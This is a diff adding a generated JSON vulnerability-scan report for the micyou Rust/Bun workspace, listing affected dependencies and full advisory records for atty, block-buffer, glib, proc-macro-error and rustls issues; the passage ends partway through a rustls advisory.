@@ -1,0 +1,2836 @@
+{
+  "generatedAt": "2026-10-27T12:58:07.883Z",
+  "scope": "Static coordinates from Cargo.lock and bun.lock, including platform/build/dev dependencies. No reachability analysis; excludes Gradle, git dependencies, vendored binaries and installed artifacts.",
+  "hashes": {
+    "cargo": "592ab7ef882dc0ba07ea82c479aa476c93bedfa2ba6998314befa6ea2119a6e4",
+    "bun": "c8b496d0ccfc11c269dade5c3d70d22bb88ad8204b3282032c4365fba15ed92b"
+  },
+  "counts": {
+    "crates.io": 800,
+    "npm": 214
+  },
+  "exclusions": [
+    {
+      "name": "micyou-app",
+      "version": "2.1.1",
+      "source": "workspace"
+    },
+    {
+      "name": "micyou-audio",
+      "version": "2.1.1",
+      "source": "workspace"
+    },
+    {
+      "name": "micyou-cli",
+      "version": "2.1.1",
+      "source": "workspace"
+    },
+    {
+      "name": "micyou-core",
+      "version": "2.1.1",
+      "source": "workspace"
+    },
+    {
+      "name": "micyou-infer",
+      "version": "2.1.1",
+      "source": "workspace"
+    },
+    {
+      "name": "micyou-plugin",
+      "version": "2.1.1",
+      "source": "workspace"
+    },
+    {
+      "name": "micyou-plugin-fixture-native",
+      "version": "2.1.1",
+      "source": "workspace"
+    },
+    {
+      "name": "micyou-protocol",
+      "version": "2.1.1",
+      "source": "workspace"
+    },
+    {
+      "name": "micyou-tui",
+      "version": "2.1.1",
+      "source": "workspace"
+    },
+    {
+      "name": "opus-decoder",
+      "version": "0.1.1",
+      "source": "git+https://github.com/tfr0305/Rusopus.git?branch=master#025a8e4e77fa544b66c4ad90cf49efe684a45faf"
+    }
+  ],
+  "online": true,
+  "matches": [
+    {
+      "package": {
+        "name": "atty",
+        "ecosystem": "crates.io"
+      },
+      "version": "0.2.14",
+      "vulns": [
+        {
+          "id": "GHSA-g98v-hv3f-hcfr",
+          "modified": "2026-09-10T03:49:53.897184Z"
+        },
+        {
+          "id": "RUSTSEC-2021-0145",
+          "modified": "2023-11-08T04:19:25.814075Z"
+        },
+        {
+          "id": "RUSTSEC-2024-0375",
+          "modified": "2024-09-26T12:26:22Z"
+        }
+      ]
+    },
+    {
+      "package": {
+        "name": "block-buffer",
+        "ecosystem": "crates.io"
+      },
+      "version": "0.10.4",
+      "vulns": [
+        {
+          "id": "GHSA-qwgh-2vcv-g2f7",
+          "modified": "2026-08-19T19:30:06.686866Z"
+        }
+      ]
+    },
+    {
+      "package": {
+        "name": "glib",
+        "ecosystem": "crates.io"
+      },
+      "version": "0.18.5",
+      "vulns": [
+        {
+          "id": "GHSA-wrw7-89jp-8q8g",
+          "modified": "2025-10-28T06:29:26.473225Z"
+        },
+        {
+          "id": "RUSTSEC-2024-0429",
+          "modified": "2025-10-28T06:29:26.473225Z"
+        }
+      ]
+    },
+    {
+      "package": {
+        "name": "proc-macro-error",
+        "ecosystem": "crates.io"
+      },
+      "version": "1.0.4",
+      "vulns": [
+        {
+          "id": "RUSTSEC-2024-0370",
+          "modified": "2026-06-07T20:00:03.923932Z"
+        }
+      ]
+    },
+    {
+      "package": {
+        "name": "rustls",
+        "ecosystem": "crates.io"
+      },
+      "version": "0.23.45",
+      "vulns": [
+        {
+          "id": "RUSTSEC-2026-0346",
+          "modified": "2026-10-14T13:30:02.480694Z"
+        },
+        {
+          "id": "RUSTSEC-2026-0347",
+          "modified": "2026-10-14T13:30:02.472103Z"
+        },
+        {
+          "id": "RUSTSEC-2026-0348",
+          "modified": "2026-10-14T13:30:02.480925Z"
+        },
+        {
+          "id": "RUSTSEC-2026-0349",
+          "modified": "2026-10-14T13:30:02.475705Z"
+        }
+      ]
+    },
+    {
+      "package": {
+        "name": "rustls-webpki",
+        "ecosystem": "crates.io"
+      },
+      "version": "0.103.15",
+      "vulns": [
+        {
+          "id": "RUSTSEC-2026-0382",
+          "modified": "2026-10-21T00:55:56.763143Z"
+        }
+      ]
+    },
+    {
+      "package": {
+        "name": "tokio",
+        "ecosystem": "crates.io"
+      },
+      "version": "1.53.1",
+      "vulns": [
+        {
+          "id": "RUSTSEC-2026-0386",
+          "modified": "2026-10-23T14:45:03.847864Z"
+        }
+      ]
+    },
+    {
+      "package": {
+        "name": "webpki-root-certs",
+        "ecosystem": "crates.io"
+      },
+      "version": "1.0.9",
+      "vulns": [
+        {
+          "id": "RUSTSEC-2026-0383",
+          "modified": "2026-10-21T06:30:02.691648Z"
+        }
+      ]
+    },
+    {
+      "package": {
+        "name": "zbus_names",
+        "ecosystem": "crates.io"
+      },
+      "version": "4.3.4",
+      "vulns": [
+        {
+          "id": "RUSTSEC-2026-0371",
+          "modified": "2026-10-17T15:30:02.407875Z"
+        }
+      ]
+    },
+    {
+      "package": {
+        "name": "zip",
+        "ecosystem": "crates.io"
+      },
+      "version": "8.6.0",
+      "vulns": [
+        {
+          "id": "RUSTSEC-2026-0367",
+          "modified": "2026-10-16T23:30:02.392172Z"
+        },
+        {
+          "id": "RUSTSEC-2026-0368",
+          "modified": "2026-10-16T23:30:02.383750Z"
+        },
+        {
+          "id": "RUSTSEC-2026-0369",
+          "modified": "2026-10-16T23:30:02.387698Z"
+        }
+      ]
+    },
+    {
+      "package": {
+        "name": "zvariant",
+        "ecosystem": "crates.io"
+      },
+      "version": "5.15.0",
+      "vulns": [
+        {
+          "id": "RUSTSEC-2026-0370",
+          "modified": "2026-10-17T15:30:02.390032Z"
+        }
+      ]
+    },
+    {
+      "package": {
+        "name": "zvariant_derive",
+        "ecosystem": "crates.io"
+      },
+      "version": "5.15.0",
+      "vulns": [
+        {
+          "id": "RUSTSEC-2026-0372",
+          "modified": "2026-10-17T15:30:02.394812Z"
+        }
+      ]
+    },
+    {
+      "package": {
+        "name": "vite",
+        "ecosystem": "npm"
+      },
+      "version": "8.3.2",
+      "vulns": [
+        {
+          "id": "GHSA-587h-7wmj-h5pm",
+          "modified": "2026-10-20T20:00:04.608979Z"
+        },
+        {
+          "id": "GHSA-698v-4r3x-3vcv",
+          "modified": "2026-10-20T18:45:09.467993Z"
+        },
+        {
+          "id": "GHSA-9jrq-w75r-8gcw",
+          "modified": "2026-10-21T17:00:26.569382Z"
+        },
+        {
+          "id": "GHSA-r825-w8mm-5pxw",
+          "modified": "2026-10-20T20:00:04.608907Z"
+        },
+        {
+          "id": "GHSA-rq7h-c2jc-7f22",
+          "modified": "2026-10-21T17:00:06.336868Z"
+        },
+        {
+          "id": "GHSA-vfpm-58rq-9qcg",
+          "modified": "2026-10-21T17:00:07.443467Z"
+        }
+      ]
+    }
+  ],
+  "advisories": [
+    {
+      "id": "GHSA-g98v-hv3f-hcfr",
+      "summary": "atty potential unaligned read",
+      "details": "On windows, `atty` dereferences a potentially unaligned pointer.\n\nIn practice however, the pointer won't be unaligned unless a custom global allocator is used.\n\nIn particular, the `System` allocator on windows uses `HeapAlloc`, which guarantees a large enough alignment.\n\n# atty is Unmaintained\n\nA Pull Request with a fix has been provided over a year ago but the maintainer seems to be unreachable.\n\nLast release of `atty` was almost 3 years ago.\n\n## Possible Alternative(s)\n\nThe below list has not been vetted in any way and may or may not contain alternatives;\n\n- [std::io::IsTerminal](https://doc.rust-lang.org/stable/std/io/trait.IsTerminal.html) - Stable since Rust 1.70.0\n- [is-terminal](https://crates.io/crates/is-terminal) - Standalone crate supporting Rust older than 1.70.0\"\n",
+      "aliases": [
+        "RUSTSEC-2021-0145"
+      ],
+      "modified": "2026-09-10T03:49:53.897184297Z",
+      "published": "2023-06-30T20:21:59Z",
+      "database_specific": {
+        "severity": "LOW",
+        "github_reviewed": true,
+        "github_reviewed_at": "2023-06-30T20:21:59Z",
+        "nvd_published_at": null,
+        "cwe_ids": []
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/softprops/atty/issues/50"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/softprops/atty/pull/51"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/softprops/atty"
+        },
+        {
+          "type": "WEB",
+          "url": "https://rustsec.org/advisories/RUSTSEC-2021-0145.html"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "atty",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/atty"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "last_affected": "0.2.14"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/06/GHSA-g98v-hv3f-hcfr/GHSA-g98v-hv3f-hcfr.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0"
+    },
+    {
+      "id": "RUSTSEC-2021-0145",
+      "summary": "Potential unaligned read",
+      "details": "On windows, `atty` dereferences a potentially unaligned pointer.\n\nIn practice however, the pointer won't be unaligned unless a custom global allocator is used.\n\nIn particular, the `System` allocator on windows uses `HeapAlloc`, which guarantees a large enough alignment.\n\n# atty is Unmaintained\n\nA Pull Request with a fix has been provided over a year ago but the maintainer seems to be unreachable.\n\nLast release of `atty` was almost 3 years ago.\n\n## Possible Alternative(s)\n\nThe below list has not been vetted in any way and may or may not contain alternatives;\n\n - [std::io::IsTerminal](https://doc.rust-lang.org/stable/std/io/trait.IsTerminal.html) - Stable since Rust 1.70.0\n - [is-terminal](https://crates.io/crates/is-terminal) - Standalone crate supporting Rust older than 1.70.0",
+      "aliases": [
+        "GHSA-g98v-hv3f-hcfr"
+      ],
+      "modified": "2023-11-08T04:19:25.814075Z",
+      "published": "2021-07-04T12:00:00Z",
+      "database_specific": {
+        "license": "CC0-1.0"
+      },
+      "references": [
+        {
+          "type": "PACKAGE",
+          "url": "https://crates.io/crates/atty"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://rustsec.org/advisories/RUSTSEC-2021-0145.html"
+        },
+        {
+          "type": "REPORT",
+          "url": "https://github.com/softprops/atty/issues/50"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/softprops/atty/pull/51"
+        },
+        {
+          "type": "REPORT",
+          "url": "https://github.com/softprops/atty/issues/57"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "atty",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/atty"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0.0.0-0"
+                }
+              ]
+            }
+          ],
+          "ecosystem_specific": {
+            "affected_functions": null,
+            "affects": {
+              "arch": [],
+              "functions": [],
+              "os": [
+                "windows"
+              ]
+            }
+          },
+          "database_specific": {
+            "categories": [],
+            "cvss": null,
+            "informational": "unsound",
+            "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2021-0145.json"
+          }
+        }
+      ],
+      "schema_version": "1.7.3"
+    },
+    {
+      "id": "RUSTSEC-2024-0375",
+      "summary": "`atty` is unmaintained",
+      "details": "The maintainer of `atty` has [published](https://github.com/softprops/atty/commit/5bfdbe9e48c6ca6a4909e8d5b04f5e843a257e93) an official notice that the crate is no longer\nunder development, and that users should instead rely on the functionality in the standard library's [`IsTerminal`](https://doc.rust-lang.org/std/io/trait.IsTerminal.html) trait.\n\n## Alternative(s)\n\n- [std::io::IsTerminal](https://doc.rust-lang.org/stable/std/io/trait.IsTerminal.html) - Stable since Rust 1.70.0 and the recommended replacement per the `atty` maintainer.\n- [is-terminal](https://crates.io/crates/is-terminal) - Standalone crate supporting Rust older than 1.70.0",
+      "modified": "2024-09-26T12:26:22Z",
+      "published": "2024-09-25T12:00:00Z",
+      "database_specific": {
+        "license": "CC0-1.0"
+      },
+      "references": [
+        {
+          "type": "PACKAGE",
+          "url": "https://crates.io/crates/atty"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://rustsec.org/advisories/RUSTSEC-2024-0375.html"
+        },
+        {
+          "type": "REPORT",
+          "url": "https://github.com/softprops/atty/issues/57"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "atty",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/atty"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0.0.0-0"
+                }
+              ]
+            }
+          ],
+          "ecosystem_specific": {
+            "affected_functions": null,
+            "affects": {
+              "os": [],
+              "arch": [],
+              "functions": []
+            }
+          },
+          "database_specific": {
+            "categories": [],
+            "cvss": null,
+            "informational": "unmaintained",
+            "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2024-0375.json"
+          }
+        }
+      ],
+      "schema_version": "1.7.3"
+    },
+    {
+      "id": "GHSA-qwgh-2vcv-g2f7",
+      "summary": "block_buffer: panic corrupts inline buffer position",
+      "details": "### Summary\n\nA caught panic may leave the cursor position of `EagerBuffer` or `ReadBuffer` in a corrupted state; this in turn allows out-of-bounds reads/writes.\n\n### Details & PoC\n\nThe following two tests fail miri:\n\n```rust\n#[cfg(miri)]\n#[test]\nfn eager_digest_blocks_panic_corrupts_inline_position() {\n    // `EagerBuffer` stores its cursor in the last byte of the internal block.\n    // When `digest_blocks` completes a previously partial block, it overwrites\n    // that byte with input data before invoking the caller-provided `compress`\n    // callback. If the callback panics, safe code can catch the panic and keep\n    // using the buffer while its cursor byte no longer satisfies the internal\n    // `pos < block_size` invariant. Under Miri this `get_pos` call reaches the\n    // `unreachable_unchecked` used for the assumed-valid cursor.\n    let mut buf = EagerBuffer::<U4>::new(&[1, 2]);\n\n    let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {\n        buf.digest_blocks(&[3, 0xff], |_| panic!(\"simulated compression failure\"));\n    }));\n\n    let _ = buf.get_pos();\n}\n\n#[cfg(miri)]\n#[test]\nfn read_buffer_generator_panic_corrupts_inline_position() {\n    // `ReadBuffer` stores its cursor in `buffer[0]`, but `write_block` gives\n    // `gen_block` mutable access to the whole internal block before restoring\n    // `buffer[0]` to a valid cursor. If `gen_block` writes an arbitrary first\n    // byte and panics, safe code can catch the panic and later observe an\n    // invalid cursor. Under Miri this `get_pos` call reaches the\n    // `unreachable_unchecked` used for the assumed-valid cursor.\n    let mut buf = ReadBuffer::<U4>::default();\n\n    let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {\n        buf.write_block(\n            1,\n            |block| {\n                block[0] = 0xff;\n                panic!(\"simulated block generation failure\");\n            },\n            |_| {},\n        );\n    }));\n\n    let _ = buf.get_pos();\n}\n```\n\nThey fail on an `unreachable_unchecked!()` under the invariant for the `pos` to always be within bounds of the block.\n\n### Impact\n\nWhile the byte that overwrites `pos` may come from untrusted input and is therefore attacker-controlled, this still relies on the surrounding code catching the panic and carrying on, which should be uncommon in practice.\n\nFor this to be exploitable, the attacker also needs a way to trigger a panic here; I have not investigated how feasible that is.\n\n### Credits\n\nThe issue was discovered by GPT-5.5",
+      "modified": "2026-08-19T19:30:06.686866977Z",
+      "published": "2026-08-19T19:15:34Z",
+      "database_specific": {
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-08-19T19:15:34Z",
+        "nvd_published_at": null,
+        "cwe_ids": [
+          "CWE-119"
+        ],
+        "severity": "MODERATE"
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/RustCrypto/utils/security/advisories/GHSA-qwgh-2vcv-g2f7"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/RustCrypto/utils"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/RustCrypto/utils/releases/tag/block-buffer-v0.12.1"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "block_buffer",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/block_buffer"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "0.12.1"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-qwgh-2vcv-g2f7/GHSA-qwgh-2vcv-g2f7.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-wrw7-89jp-8q8g",
+      "summary": "Unsoundness in `Iterator` and `DoubleEndedIterator` impls for `glib::VariantStrIter`",
+      "details": "The `VariantStrIter::impl_get` function (called internally by implementations of the `Iterator` and `DoubleEndedIterator` traits for this type) was unsound, resulting in undefined behaviour.\n\nAn immutable reference `&p` to a `*mut libc::c_char` pointer initialized to `NULL` was passed as an argument to a C function that that mutates the pointer behind `&p` in-place (i.e. as an out-argument), which was unsound. After changes in recent versions of the Rust compiler, these unsound writes through `&p` now seem to be completely disregarded when building the `glib` crate with optimizations.\n\nThis subsequently caused all calls of `VariantStrIter::impl_get` to violate the safety requirements of the `std::ffi::CStr::from_ptr` function - which requires its argument to be a valid pointer to a C-style string - resulting in crashes due to `NULL` pointer dereferences.\n\nThis was fixed by passing the out-argument pointer explitly as `&mut p` instead of `&p`.\n\nThis issue has been present since this code was initially added in `glib` v0.15.0. The mismatch in mutability was likely missed (and not raised as an error by the compiler) because the C function wrapped by `VariantStrIter::impl_get` is variadic (`glib_sys::g_variant_get_child`), and the pointer in question is one of the variadic arguments.\n\n",
+      "aliases": [
+        "RUSTSEC-2024-0429"
+      ],
+      "modified": "2025-10-28T06:29:26.473225Z",
+      "published": "2024-12-23T20:19:24Z",
+      "database_specific": {
+        "severity": "MODERATE",
+        "github_reviewed": true,
+        "github_reviewed_at": "2024-12-23T20:19:24Z",
+        "nvd_published_at": null,
+        "cwe_ids": []
+      },
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/gtk-rs/gtk-rs-core/pull/1343"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/gtk-rs/gtk-rs-core"
+        },
+        {
+          "type": "WEB",
+          "url": "https://rustsec.org/advisories/RUSTSEC-2024-0429.html"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "glib",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/glib"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0.15.0"
+                },
+                {
+                  "fixed": "0.20.0"
+                }
+              ]
+            }
+          ],
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/12/GHSA-wrw7-89jp-8q8g/GHSA-wrw7-89jp-8q8g.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N"
+        }
+      ]
+    },
+    {
+      "id": "RUSTSEC-2024-0429",
+      "summary": "Unsoundness in `Iterator` and `DoubleEndedIterator` impls for `glib::VariantStrIter`",
+      "details": "The `VariantStrIter::impl_get` function (called internally by implementations of the `Iterator` and `DoubleEndedIterator` traits for this type) was unsound, resulting in undefined behaviour.\n\nAn immutable reference `&p` to a `*mut libc::c_char` pointer initialized to `NULL` was passed as an argument to a C function that that mutates the pointer behind `&p` in-place (i.e. as an out-argument), which was unsound. After changes in recent versions of the Rust compiler, these unsound writes through `&p` now seem to be completely disregarded when building the `glib` crate with optimizations.\n\nThis subsequently caused all calls of `VariantStrIter::impl_get` to violate the safety requirements of the `std::ffi::CStr::from_ptr` function - which requires its argument to be a valid pointer to a C-style string - resulting in crashes due to `NULL` pointer dereferences.\n\nThis was fixed by passing the out-argument pointer explitly as `&mut p` instead of `&p`.\n\nThis issue has been present since this code was initially added in `glib` v0.15.0. The mismatch in mutability was likely missed (and not raised as an error by the compiler) because the C function wrapped by `VariantStrIter::impl_get` is variadic (`glib_sys::g_variant_get_child`), and the pointer in question is one of the variadic arguments.",
+      "aliases": [
+        "GHSA-wrw7-89jp-8q8g"
+      ],
+      "modified": "2025-10-28T06:29:26.473225Z",
+      "published": "2024-03-30T12:00:00Z",
+      "database_specific": {
+        "license": "CC0-1.0"
+      },
+      "references": [
+        {
+          "type": "PACKAGE",
+          "url": "https://crates.io/crates/glib"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://rustsec.org/advisories/RUSTSEC-2024-0429.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/gtk-rs/gtk-rs-core/pull/1343"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "glib",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/glib"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0.15.0"
+                },
+                {
+                  "fixed": "0.20.0"
+                }
+              ]
+            }
+          ],
+          "ecosystem_specific": {
+            "affected_functions": null,
+            "affects": {
+              "arch": [],
+              "functions": [
+                "glib::VariantStrIter::last",
+                "glib::VariantStrIter::next",
+                "glib::VariantStrIter::next_back",
+                "glib::VariantStrIter::nth",
+                "glib::VariantStrIter::nth_back"
+              ],
+              "os": []
+            }
+          },
+          "database_specific": {
+            "informational": "unsound",
+            "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2024-0429.json",
+            "categories": [],
+            "cvss": null
+          }
+        }
+      ],
+      "schema_version": "1.7.3"
+    },
+    {
+      "id": "RUSTSEC-2024-0370",
+      "summary": "proc-macro-error is unmaintained",
+      "details": "proc-macro-error's maintainer seems to be unreachable, with no commits for 2 years, no releases pushed for 4 years, and no activity on the GitLab repo or response to email.\n\nproc-macro-error also depends on `syn 1.x`, which may be bringing duplicate dependencies into dependant build trees.\n\n## Possible Alternative(s)\n\n- [manyhow](https://crates.io/crates/manyhow)\n- [proc-macro2-diagnostics](https://github.com/SergioBenitez/proc-macro2-diagnostics)",
+      "modified": "2026-06-07T20:00:03.923932350Z",
+      "published": "2024-09-01T12:00:00Z",
+      "database_specific": {
+        "license": "CC0-1.0"
+      },
+      "references": [
+        {
+          "type": "PACKAGE",
+          "url": "https://crates.io/crates/proc-macro-error"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://rustsec.org/advisories/RUSTSEC-2024-0370.html"
+        },
+        {
+          "type": "REPORT",
+          "url": "https://gitlab.com/CreepySkeleton/proc-macro-error/-/issues/20"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "proc-macro-error",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/proc-macro-error"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0.0.0-0"
+                }
+              ]
+            }
+          ],
+          "ecosystem_specific": {
+            "affects": {
+              "os": [],
+              "functions": [],
+              "arch": []
+            },
+            "affected_functions": null
+          },
+          "database_specific": {
+            "cvss": null,
+            "informational": "unmaintained",
+            "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2024-0370.json",
+            "categories": []
+          }
+        }
+      ],
+      "schema_version": "1.7.5"
+    },
+    {
+      "id": "RUSTSEC-2026-0346",
+      "summary": "`Debug` impls for client session values expose TLS secrets",
+      "details": "The `Debug` implementations of `Tls12ClientSessionValue` and\n`Tls13ClientSessionValue` were derived, and so included the TLS 1.2 master\nsecret or TLS 1.3 resumption PSK in their output.\n\nCustom `ClientSessionStore` implementations that format these values with\n`Debug` (for example, when logging) could disclose these secrets to readers of\nthe logs. This conflicts with rustls's\n[key-material redaction policy](https://github.com/rustls/rustls/blob/99f2358cae2954837dbb866faf6727de75489ab9/SECURITY.md#boundary-public-api).\n\nOrdinary connection and built-in session cache `Debug` output is redacted and\nis not affected.",
+      "aliases": [
+        "GHSA-c8m5-c952-6cm4"
+      ],
+      "modified": "2026-10-14T13:30:02.480694744Z",
+      "published": "2026-10-14T12:00:00Z",
+      "database_specific": {
+        "license": "CC0-1.0"
+      },
+      "references": [
+        {
+          "type": "PACKAGE",
+          "url": "https://crates.io/crates/rustls"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://rustsec.org/advisories/RUSTSEC-2026-0346.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rustls/rustls/pull/3299"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "rustls",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/rustls"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0.21.0"
+                },
+                {
+                  "fixed": "0.23.46"
+                }
+              ]
+            }
+          ],
+          "ecosystem_specific": {
+            "affects": {
+              "functions": [],
+              "arch": [],
+              "os": []
+            },
+            "affected_functions": null
+          },
+          "database_specific": {
+            "categories": [
+              "crypto-failure"
+            ],
+            "cvss": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:N/A:N",
+            "informational": null,
+            "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2026-0346.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:H/I:N/A:N"
+        }
+      ]
+    },
+    {
+      "id": "RUSTSEC-2026-0347",
+      "summary": "Buffered application data sent to outer server after ECH rejection",
+      "details": "When a server rejects Encrypted Client Hello (ECH), the client completes the\nhandshake using the outer ClientHello and authenticates the server against the\nECH config's `public_name`. At the end of that handshake, rustls encrypted and\nqueued any application data buffered via `ClientConnection::writer()` *before*\nqueueing the `ech_required` alert.\n\nThe application correctly receives\n`Error::PeerIncompatible(ServerRejectedEncryptedClientHello)`, but the next\n`write_tls()` call (needed to send the alert) also sends the buffered\napplication data. Plaintext meant for the inner server therefore goes to the\nclient-facing server named by `public_name`.\n\nThat server is authenticated, so this is not exploitable by an unauthenticated\nparty, but it violates RFC 9849 section 6.1.6, which requires the client to\nabort with `ech_required` \"before sending any application data to the server\".\n\nThis affects only clients that:\n\n- use `EchMode::Enable` (GREASE ECH is not affected),\n- write application data before the handshake completes, and\n- connect to a server that rejects their ECH config (for example, because it is stale).\n\nThe underlying ordering bug is older, but before 0.23.44 the client checked\nthe server certificate against the inner server name rather than `public_name`,\nso certificate verification failed first and no data was sent.",
+      "aliases": [
+        "GHSA-vp88-798v-h67f"
+      ],
+      "modified": "2026-10-14T13:30:02.472103370Z",
+      "published": "2026-10-14T12:00:00Z",
+      "database_specific": {
+        "license": "CC0-1.0"
+      },
+      "references": [
+        {
+          "type": "PACKAGE",
+          "url": "https://crates.io/crates/rustls"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://rustsec.org/advisories/RUSTSEC-2026-0347.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rustls/rustls/pull/3300"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "rustls",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/rustls"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0.23.44"
+                },
+                {
+                  "fixed": "0.23.46"
+                }
+              ]
+            }
+          ],
+          "ecosystem_specific": {
+            "affects": {
+              "functions": [],
+              "arch": [],
+              "os": []
+            },
+            "affected_functions": null
+          },
+          "database_specific": {
+            "cvss": "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:L/I:N/A:N",
+            "informational": null,
+            "categories": [
+              "crypto-failure"
+            ],
+            "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2026-0347.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:L/I:N/A:N"
+        }
+      ]
+    },
+    {
+      "id": "RUSTSEC-2026-0348",
+      "summary": "Brotli certificate decompression can allocate up to 1 GiB before authentication",
+      "details": "The built-in Brotli certificate decompressor (enabled by the non-default\n`brotli` crate feature) bounded the size of the decompressed output, but\naccepted a peer-selected history window. Brotli's large-window extension was\nenabled, so a five-byte header could cause an allocation of 1 GiB. A peer can\nabort a process whose allocator cannot satisfy that request.\n\nNo trusted certificate is required by the attacker. Affected configurations are:\n\n- clients that enable the `brotli` feature and connect to a malicious server, and\n- servers that enable the `brotli` feature and request client certificates.\n\nApplications that do not enable the `brotli` feature are not affected.",
+      "aliases": [
+        "GHSA-h2v8-394m-p7vv"
+      ],
+      "modified": "2026-10-14T13:30:02.480925286Z",
+      "published": "2026-10-14T12:00:00Z",
+      "database_specific": {
+        "license": "CC0-1.0"
+      },
+      "references": [
+        {
+          "type": "PACKAGE",
+          "url": "https://crates.io/crates/rustls"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://rustsec.org/advisories/RUSTSEC-2026-0348.html"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rustls/rustls/pull/3297"
+        }
+      ],
+      "affected": [
+        {
+          "package": {
+            "name": "rustls",
+            "ecosystem": "crates.io",
+            "purl": "pkg:cargo/rustls"
+          },
+          "ranges": [
+            {
+              "type": "SEMVER",
+              "events": [
+                {
+                  "introduced": "0.23.9"
+                },
+                {
+                  "fixed": "0.23.46"
+                }
+              ]
+            }
+          ],
+          "ecosystem_specific": {
+            "affected_functions": null,
+            "affects": {
+              "functions": [],
+              "arch": [],
+              "os": []
+            }
+          },
+          "database_specific": {
+            "informational": null,
+            "categories": [
+              "denial-of-service"
+            ],
+            "cvss": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+            "source": "https://github.com/rustsec/advisory-db/blob/osv/crates/RUSTSEC-2026-0348.json"
+          }
+        }
+      ],
+      "schema_version": "1.9.0",
+      "severity": [
+        {
